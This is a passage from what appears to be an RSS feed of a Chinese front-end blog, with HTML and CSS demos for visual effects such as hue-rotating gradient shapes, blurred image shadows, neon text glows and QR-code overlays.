%5Cn%20%20clip-path%3A%20polygon(10%25%200%2C%20100%25%2070%25%2C%20100%25%20100%25%2C%2020%25%2090%25)%3B%5Cn%20%20animation%3A%20hue-rotate%205s%20linear%20infinite%3B%5Cn%7D%5Cn%5Cnsection%3Anth-child(3)%20%7B%5Cn%20%20right%3A%2030%25%3B%5Cn%20%20bottom%3A%200%3B%5Cn%20%20width%3A%2090%25%3B%5Cn%20%20height%3A%2070%25%3B%5Cn%20%20transform%3A%20translateX(50%25)%3B%5Cn%20%20background%3A%20linear-gradient(%235750e9%2C%20%235752b6)%3B%5Cn%20%20clip-path%3A%20polygon(80%25%200%2C%20100%25%2070%25%2C%20100%25%20100%25%2C%2020%25%2090%25)%3B%5Cn%20%20animation%3A%20hue-rotate%205s%20linear%20infinite%3B%5Cn%7D%5Cn%5Cn%40keyframes%20hue-rotate%20%7B%5Cn%20%200%25%20%7B%5Cn%20%20%20%20filter%3A%20hue-rotate(0deg)%3B%5Cn%20%20%7D%5Cn%20%20100%25%20%7B%5Cn%20%20%20%20filter%3A%20hue-rotate(360deg)%3B%5Cn%20%20%7D%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>span</span><span>></span></span>Magic<span><span><span>&lt;/</span>span</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
  <span>position</span><span>:</span> relative<span>;</span>
<span>}</span>

<span>main::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>' '</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> 0<span>;</span>
  <span>left</span><span>:</span> 0<span>;</span>
  <span>bottom</span><span>:</span> 0<span>;</span>
  <span>right</span><span>:</span> 0<span>;</span>
  <span>backdrop-filter</span><span>:</span> <span>blur</span><span>(</span>150px<span>)</span><span>;</span>
  <span>z-index</span><span>:</span> 1<span>;</span>
<span>}</span>

<span>span</span> <span>{</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> 50%<span>;</span>
  <span>left</span><span>:</span> 50%<span>;</span>
  <span>transform</span><span>:</span> <span>translate</span><span>(</span>-50%<span>,</span> -50%<span>)</span><span>;</span>
  <span>z-index</span><span>:</span> 2<span>;</span>
  <span>font-size</span><span>:</span> 7em<span>;</span>
  <span>-webkit-background-clip</span><span>:</span> text<span>;</span>
  <span>-webkit-text-fill-color</span><span>:</span> transparent<span>;</span>
  <span>background-image</span><span>:</span> <span>linear-gradient</span><span>(</span>90deg<span>,</span> #f66<span>,</span> #f90<span>)</span><span>;</span>
  <span>animation</span><span>:</span> hue-rotate 5s linear infinite<span>;</span>
<span>}</span>

<span>section</span> <span>{</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>opacity</span><span>:</span> 0.7<span>;</span>
<span>}</span>

<span>section:nth-child(1)</span> <span>{</span>
  <span>left</span><span>:</span> 50%<span>;</span>
  <span>bottom</span><span>:</span> 20%<span>;</span>
  <span>width</span><span>:</span> 80%<span>;</span>
  <span>height</span><span>:</span> 70%<span>;</span>
  <span>transform</span><span>:</span> <span>translateX</span><span>(</span>-50%<span>)</span><span>;</span>
  <span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>#ffee55<span>,</span> #fdee99<span>)</span><span>;</span>
  <span>clip-path</span><span>:</span> <span>polygon</span><span>(</span>0 10%<span>,</span> 30% 0<span>,</span> 100% 40%<span>,</span> 70% 100%<span>,</span> 20% 90%<span>)</span><span>;</span>
  <span>animation</span><span>:</span> hue-rotate 5s linear infinite<span>;</span>
<span>}</span>

<span>section:nth-child(2)</span> <span>{</span>
  <span>left</span><span>:</span> 30%<span>;</span>
  <span>bottom</span><span>:</span> 0<span>;</span>
  <span>width</span><span>:</span> 90%<span>;</span>
  <span>height</span><span>:</span> 70%<span>;</span>
  <span>transform</span><span>:</span> <span>translateX</span><span>(</span>-50%<span>)</span><span>;</span>
  <span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>#e950d1<span>,</span> #f980d9<span>)</span><span>;</span>
  <span>clip-path</span><span>:</span> <span>polygon</span><span>(</span>10% 0<span>,</span> 100% 70%<span>,</span> 100% 100%<span>,</span> 20% 90%<span>)</span><span>;</span>
  <span>animation</span><span>:</span> hue-rotate 5s linear infinite<span>;</span>
<span>}</span>

<span>section:nth-child(3)</span> <span>{</span>
  <span>right</span><span>:</span> 30%<span>;</span>
  <span>bottom</span><span>:</span> 0<span>;</span>
  <span>width</span><span>:</span> 90%<span>;</span>
  <span>height</span><span>:</span> 70%<span>;</span>
  <span>transform</span><span>:</span> <span>translateX</span><span>(</span>50%<span>)</span><span>;</span>
  <span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>#5750e9<span>,</span> #5752b6<span>)</span><span>;</span>
  <span>clip-path</span><span>:</span> <span>polygon</span><span>(</span>80% 0<span>,</span> 100% 70%<span>,</span> 100% 100%<span>,</span> 20% 90%<span>)</span><span>;</span>
  <span>animation</span><span>:</span> hue-rotate 5s linear infinite<span>;</span>
<span>}</span>

<span><span>@keyframes</span> hue-rotate</span> <span>{</span>
  <span>0%</span> <span>{</span>
    <span>filter</span><span>:</span> <span>hue-rotate</span><span>(</span>0deg<span>)</span><span>;</span>
  <span>}</span>
  <span>100%</span> <span>{</span>
    <span>filter</span><span>:</span> <span>hue-rotate</span><span>(</span>360deg<span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br></div></div>
            </div>
          </div>
          
        </div>
]]></content:encoded>
    </item>
    <item>
      <title>图像阴影</title>
      <link>https://www.matrixtheone.ga/web/magic/Image-Shadow/</link>
      <guid>https://www.matrixtheone.ga/web/magic/Image-Shadow/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">图像阴影</source>
      <category>CSS</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<blockquote>
<p>利用 filter 制造伪阴影</p>
</blockquote>

          <div
            id="code-demo-6a77735e"
           
  
 

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20place-items%3A%20center%3B%5Cn%7D%5Cn%5Cnsection%20%7B%5Cn%20%20position%3A%20relative%3B%5Cn%20%20width%3A%20200px%3B%5Cn%20%20height%3A%20200px%3B%5Cn%20%20border-radius%3A%2050%25%3B%5Cn%20%20background%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing.webp)%20center%2Fcover%20no-repeat%3B%5Cn%7D%5Cn%5Cnsection%3A%3Aafter%20%7B%5Cn%20%20content%3A%20'%20'%3B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20top%3A%207%25%3B%5Cn%20%20z-index%3A%20-1%3B%5Cn%20%20width%3A%20100%25%3B%5Cn%20%20height%3A%20100%25%3B%5Cn%20%20border-radius%3A%2050%25%3B%5Cn%20%20background%3A%20inherit%3B%5Cn%20%20filter%3A%20blur(10px)%20brightness(80%25)%20opacity(0.8)%3B%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>place-items</span><span>:</span> center<span>;</span>
<span>}</span>

<span>section</span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>
  <span>width</span><span>:</span> 200px<span>;</span>
  <span>height</span><span>:</span> 200px<span>;</span>
  <span>border-radius</span><span>:</span> 50%<span>;</span>
  <span>background</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing.webp<span>)</span></span> center/cover no-repeat<span>;</span>
<span>}</span>

<span>section::after</span> <span>{</span>
  <span>content</span><span>:</span> <span>' '</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> 7%<span>;</span>
  <span>z-index</span><span>:</span> -1<span>;</span>
  <span>width</span><span>:</span> 100%<span>;</span>
  <span>height</span><span>:</span> 100%<span>;</span>
  <span>border-radius</span><span>:</span> 50%<span>;</span>
  <span>background</span><span>:</span> inherit<span>;</span>
  <span>filter</span><span>:</span> <span>blur</span><span>(</span>10px<span>)</span> <span>brightness</span><span>(</span>80%<span>)</span> <span>opacity</span><span>(</span>0.8<span>)</span><span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div>
            </div>
          </div>
          
        </div>
]]></content:encoded>
    </item>
    <item>
      <title>霓虹灯</title>
      <link>https://www.matrixtheone.ga/web/magic/Neon/</link>
      <guid>https://www.matrixtheone.ga/web/magic/Neon/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">霓虹灯</source>
      <category>CSS</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[
          <div
            id="code-demo-01089fb6"
           
  
 data-title=""

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Cspan%3EMagic%3C%2Fspan%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20background%3A%20%23000%3B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20place-items%3A%20center%3B%5Cn%7D%5Cn%5Cnspan%20%7B%5Cn%20%20font-family%3A%20'Lobster'%3B%5Cn%20%20font-size%3A%2010vmin%3B%5Cn%20%20text-align%3A%20center%3B%5Cn%20%20cursor%3A%20pointer%3B%5Cn%20%20letter-spacing%3A%204px%3B%5Cn%20%20user-select%3A%20none%3B%5Cn%20%20color%3A%20%23fff%3B%5Cn%20%20filter%3A%20brightness(110%25)%3B%20%2F*%20%E4%BA%AE%E5%BA%A6%20*%2F%5Cn%20%20text-shadow%3A%200%200%205px%20var(--color-white)%2C%200%200%2010px%20var(--color-white)%2C%5Cn%20%20%20%200%200%2015px%20var(--color-white)%2C%200%200%2020px%20var(--color-red)%2C%5Cn%20%20%20%200%200%2035px%20var(--color-red)%2C%200%200%2040px%20var(--color-red)%2C%5Cn%20%20%20%200%200%2050px%20var(--color-red)%2C%200%200%2075px%20var(--color-red)%3B%5Cn%5Cn%20%20--color-white%3A%20%23fff%3B%5Cn%20%20--color-red%3A%20%23e91e63%3B%5Cn%7D%5Cn%5Cnspan%3Ahover%20%7B%5Cn%20%20color%3A%20var(--color-white)%3B%5Cn%20%20animation%3A%20neon%201.5s%20ease-in-out%20infinite%20alternate%3B%5Cn%7D%5Cn%5Cn%40keyframes%20neon%20%7B%5Cn%20%20to%20%7B%5Cn%20%20%20%20text-shadow%3A%200%200%2010px%20var(--color-white)%2C%200%200%2020px%20var(--color-white)%2C%5Cn%20%20%20%20%20%200%200%2030px%20var(--color-white)%2C%200%200%2040px%20var(--color-red)%2C%5Cn%20%20%20%20%20%200%200%2070px%20var(--color-red)%2C%200%200%2080px%20var(--color-red)%2C%5Cn%20%20%20%20%20%200%200%20100px%20var(--color-red)%2C%200%200%20150px%20var(--color-red)%3B%5Cn%20%20%7D%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>span</span><span>></span></span>Magic<span><span><span>&lt;/</span>span</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>background</span><span>:</span> #000<span>;</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>place-items</span><span>:</span> center<span>;</span>
<span>}</span>

<span>span</span> <span>{</span>
  <span>font-family</span><span>:</span> <span>'Lobster'</span><span>;</span>
  <span>font-size</span><span>:</span> 10vmin<span>;</span>
  <span>text-align</span><span>:</span> center<span>;</span>
  <span>cursor</span><span>:</span> pointer<span>;</span>
  <span>letter-spacing</span><span>:</span> 4px<span>;</span>
  <span>user-select</span><span>:</span> none<span>;</span>
  <span>color</span><span>:</span> #fff<span>;</span>
  <span>filter</span><span>:</span> <span>brightness</span><span>(</span>110%<span>)</span><span>;</span> <span>/* 亮度 */</span>
  <span>text-shadow</span><span>:</span> 0 0 5px <span>var</span><span>(</span>--color-white<span>)</span><span>,</span> 0 0 10px <span>var</span><span>(</span>--color-white<span>)</span><span>,</span>
    0 0 15px <span>var</span><span>(</span>--color-white<span>)</span><span>,</span> 0 0 20px <span>var</span><span>(</span>--color-red<span>)</span><span>,</span>
    0 0 35px <span>var</span><span>(</span>--color-red<span>)</span><span>,</span> 0 0 40px <span>var</span><span>(</span>--color-red<span>)</span><span>,</span>
    0 0 50px <span>var</span><span>(</span>--color-red<span>)</span><span>,</span> 0 0 75px <span>var</span><span>(</span>--color-red<span>)</span><span>;</span>

  <span>--color-white</span><span>:</span> #fff<span>;</span>
  <span>--color-red</span><span>:</span> #e91e63<span>;</span>
<span>}</span>

<span>span:hover</span> <span>{</span>
  <span>color</span><span>:</span> <span>var</span><span>(</span>--color-white<span>)</span><span>;</span>
  <span>animation</span><span>:</span> neon 1.5s ease-in-out infinite alternate<span>;</span>
<span>}</span>

<span><span>@keyframes</span> neon</span> <span>{</span>
  <span>to</span> <span>{</span>
    <span>text-shadow</span><span>:</span> 0 0 10px <span>var</span><span>(</span>--color-white<span>)</span><span>,</span> 0 0 20px <span>var</span><span>(</span>--color-white<span>)</span><span>,</span>
      0 0 30px <span>var</span><span>(</span>--color-white<span>)</span><span>,</span> 0 0 40px <span>var</span><span>(</span>--color-red<span>)</span><span>,</span>
      0 0 70px <span>var</span><span>(</span>--color-red<span>)</span><span>,</span> 0 0 80px <span>var</span><span>(</span>--color-red<span>)</span><span>,</span>
      0 0 100px <span>var</span><span>(</span>--color-red<span>)</span><span>,</span> 0 0 150px <span>var</span><span>(</span>--color-red<span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br></div></div>
            </div>
          </div>
          
        </div>

          <div
            id="code-demo-b681e42a"
           
  
 data-title=""

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20place-items%3A%20center%3B%5Cn%20%20background%3A%20%23000%3B%5Cn%7D%5Cn%5Cnsection%20%7B%5Cn%20%20width%3A%20200px%3B%5Cn%20%20height%3A%20200px%3B%5Cn%20%20position%3A%20relative%3B%5Cn%7D%5Cn%5Cnsection%3A%3Abefore%2C%5Cnsection%3A%3Aafter%20%7B%5Cn%20%20content%3A%20'%20'%3B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20top%3A%200%3B%5Cn%20%20left%3A%200%3B%5Cn%20%20bottom%3A%200%3B%5Cn%20%20right%3A%200%3B%5Cn%20%20border-radius%3A%2050%25%3B%5Cn%20%20border-top%3A%2010px%20solid%20%23fff%3B%5Cn%20%20filter%3A%20drop-shadow(0%200%202px%20var(--colorA))%20drop-shadow(0%200%205px%20var(--colorA))%5Cn%20%20%20%20drop-shadow(0%200%2010px%20var(--colorA))%20drop-shadow(0%200%2020px%20var(--colorA))%3B%5Cn%20%20animation%3A%20rotate%203s%20infinite%20linear%3B%5Cn%7D%5Cn%5Cnsection%3A%3Abefore%20%7B%5Cn%20%20--colorA%3A%20%23b78eff%3B%5Cn%7D%5Cn%5Cnsection%3A%3Aafter%20%7B%5Cn%20%20--colorA%3A%20%23ffec41%3B%5Cn%20%20animation-delay%3A%20-1.5s%3B%5Cn%7D%5Cn%5Cn%40keyframes%20rotate%20%7B%5Cn%20%20100%25%20%7B%5Cn%20%20%20%20transform%3A%20rotate(360deg)%3B%5Cn%20%20%7D%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>place-items</span><span>:</span> center<span>;</span>
  <span>background</span><span>:</span> #000<span>;</span>
<span>}</span>

<span>section</span> <span>{</span>
  <span>width</span><span>:</span> 200px<span>;</span>
  <span>height</span><span>:</span> 200px<span>;</span>
  <span>position</span><span>:</span> relative<span>;</span>
<span>}</span>

<span>section::before,
section::after</span> <span>{</span>
  <span>content</span><span>:</span> <span>' '</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> 0<span>;</span>
  <span>left</span><span>:</span> 0<span>;</span>
  <span>bottom</span><span>:</span> 0<span>;</span>
  <span>right</span><span>:</span> 0<span>;</span>
  <span>border-radius</span><span>:</span> 50%<span>;</span>
  <span>border-top</span><span>:</span> 10px solid #fff<span>;</span>
  <span>filter</span><span>:</span> <span>drop-shadow</span><span>(</span>0 0 2px <span>var</span><span>(</span>--colorA<span>)</span><span>)</span> <span>drop-shadow</span><span>(</span>0 0 5px <span>var</span><span>(</span>--colorA<span>)</span><span>)</span>
    <span>drop-shadow</span><span>(</span>0 0 10px <span>var</span><span>(</span>--colorA<span>)</span><span>)</span> <span>drop-shadow</span><span>(</span>0 0 20px <span>var</span><span>(</span>--colorA<span>)</span><span>)</span><span>;</span>
  <span>animation</span><span>:</span> rotate 3s infinite linear<span>;</span>
<span>}</span>

<span>section::before</span> <span>{</span>
  <span>--colorA</span><span>:</span> #b78eff<span>;</span>
<span>}</span>

<span>section::after</span> <span>{</span>
  <span>--colorA</span><span>:</span> #ffec41<span>;</span>
  <span>animation-delay</span><span>:</span> -1.5s<span>;</span>
<span>}</span>

<span><span>@keyframes</span> rotate</span> <span>{</span>
  <span>100%</span> <span>{</span>
    <span>transform</span><span>:</span> <span>rotate</span><span>(</span>360deg<span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br></div></div>
            </div>
          </div>
          
        </div>
]]></content:encoded>
    </item>
    <item>
      <title>二维码</title>
      <link>https://www.matrixtheone.ga/web/magic/QR-Code/</link>
      <guid>https://www.matrixtheone.ga/web/magic/QR-Code/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">二维码</source>
      <category>CSS</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[
          <div
            id="code-demo-f65656fe"
           
  
 data-title=""

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20place-items%3A%20center%3B%5Cn%7D%5Cn%5Cnsection%20%7B%5Cn%20%20width%3A%20200px%3B%5Cn%20%20height%3A%20200px%3B%5Cn%20%20position%3A%20relative%3B%5Cn%20%20background%3A%20url(..%2F..%2Fimages%2Fqr-code.png)%20center%2Fcover%20no-repeat%3B%5Cn%7D%5Cn%5Cnsection%3A%3Abefore%20%7B%5Cn%20%20content%3A%20'%20'%3B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20top%3A%200%3B%5Cn%20%20left%3A%200%3B%5Cn%20%20bottom%3A%200%3B%5Cn%20%20right%3A%200%3B%5Cn%20%20background%3A%20linear-gradient(45deg%2C%20rgb(51%2C%20102%2C%20153)%2C%20rgb(255%2C%200%2C%20204))%3B%5Cn%20%20%2F*%20%E4%B8%AD%E9%97%B4%E7%95%99%E7%A9%BA%EF%BC%8C%E5%A4%B4%E5%83%8F%E4%B8%8D%E4%B8%8A%E8%89%B2%20*%2F%5Cn%20%20-webkit-mask%3A%20radial-gradient(%5Cn%20%20%20%20rgba(0%2C%200%2C%200%2C%200)%2C%5Cn%20%20%20%20rgba(0%2C%200%2C%200%2C%200)%2015%25%2C%5Cn%20%20%20%20rgb(0%2C%200%2C%200)%2015%25%5Cn%20%20)%3B%5Cn%20%20mix-blend-mode%3A%20lighten%3B%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>place-items</span><span>:</span> center<span>;</span>
<span>}</span>

<span>section</span> <span>{</span>
  <span>width</span><span>:</span> 200px<span>;</span>
  <span>height</span><span>:</span> 200px<span>;</span>
  <span>position</span><span>:</span> relative<span>;</span>
  <span>background</span><span>:</span> <span><span>url</span><span>(</span>../../images/qr-code.png<span>)</span></span> center/cover no-repeat<span>;</span>
<span>}</span>

<span>section::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>' '</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> 0<span>;</span>
  <span>left</span><span>:</span> 0<span>;</span>
  <span>bottom</span><span>:</span> 0<span>;</span>
  <span>right</span><span>:</span> 0<span>;</span>
  <span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>45deg<span>,</span> <span>rgb</span><span>(</span>51<span>,</span> 102<span>,</span> 153<span>)</span><span>,</span> <span>rgb</span><span>(</span>255<span>,</span> 0<span>,</span> 204<span>)</span><span>)</span><span>;</span>
  <span>/* 中间留空，头像不上色 */</span>
  <span>-webkit-mask</span><span>:</span> <span>radial-gradient</span><span>(</span>
    <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0<span>)</span><span>,</span>
    <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0<span>)</span> 15%<span>,</span>
    <span>rgb</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>)</span> 15%
  <span>)</span><span>;</span>
  <span>mix-blend-mode</span><span>:</span> lighten<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br></div></div>
            </div>
          </div>
          
        </div>

          <div
            id="code-demo-0fc3c985"
           
  
 data-title=""

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Csection%3E%5Cn%20%20%20%20%3Cdiv%20class%3D%5C%22qr-code%5C%22%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22line%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%3C%2Fsection%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20place-items%3A%20center%3B%5Cn%20%20--color%3A%20%230f3%3B%5Cn%7D%5Cn%5Cnsection%20%7B%5Cn%20%20position%3A%20relative%3B%5Cn%20%20width%3A%20200px%3B%5Cn%20%20height%3A%20200px%3B%5Cn%20%20overflow%3A%20hidden%3B%5Cn%20%20box-shadow%3A%20inset%200%200%200%203px%20var(--color)%3B%5Cn%7D%5Cn%5Cnsection%3A%3Abefore%20%7B%5Cn%20%20content%3A%20'%20'%3B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20top%3A%2050%25%3B%5Cn%20%20left%3A%2050%25%3B%5Cn%20%20width%3A%20200%25%3B%5Cn%20%20height%3A%2080%25%3B%5Cn%20%20transform%3A%20translate(-50%25%2C%20-50%25)%3B%5Cn%20%20background%3A%20%23fff%3B%5Cn%7D%5Cn%5Cnsection%3A%3Aafter%20%7B%5Cn%20%20content%3A%20'%20'%3B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20top%3A%2050%25%3B%5Cn%20%20left%3A%2050%25%3B%5Cn%20%20width%3A%2080%25%3B%5Cn%20%20height%3A%20200%25%3B%5Cn%20%20transform%3A%20translate(-50%25%2C%20-50%25)%3B%5Cn%20%20background%3A%20%23fff%3B%5Cn%7D%5Cn%5Cn.qr-code%20%7B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20overflow%3A%20hidden%3B%5Cn%20%20z-index%3A%201%3B%5Cn%20%20top%3A%2050%25%3B%5Cn%20%20left%3A%2050%25%3B%5Cn%20%20width%3A%2098%25%3B%5Cn%20%20height%3A%2098%25%3B%5Cn%20%20transform%3A%20translate(-50%25%2C%20-50%25)%3B%5Cn%20%20background%3A%20url(..%2F..%2Fimages%2Fqr-code.png)%20center%2Fcover%20no-repeat%3B%5Cn%7D%5Cn%5Cn.line%20%7B%5Cn%20%20position%3A%20relative%3B%5Cn%20%20width%3A%20100%25%3B%5Cn%20%20height%3A%20100%25%3B%5Cn%20%20transform%3A%20translateY(-100%25)%3B%5Cn%20%20border-bottom%3A%203px%20solid%20var(--color)%3B%5Cn%20%20animation%3A%20radar-beam%202s%20cubic-bezier(0.53%2C%200%2C%200.43%2C%200.99)%20infinite%3B%5Cn%20%20background%3A%20linear-gradient(180deg%2C%20transparent%2043%25%2C%20var(--color)%20211%25)%3B%5Cn%7D%5Cn%5Cn%40keyframes%20r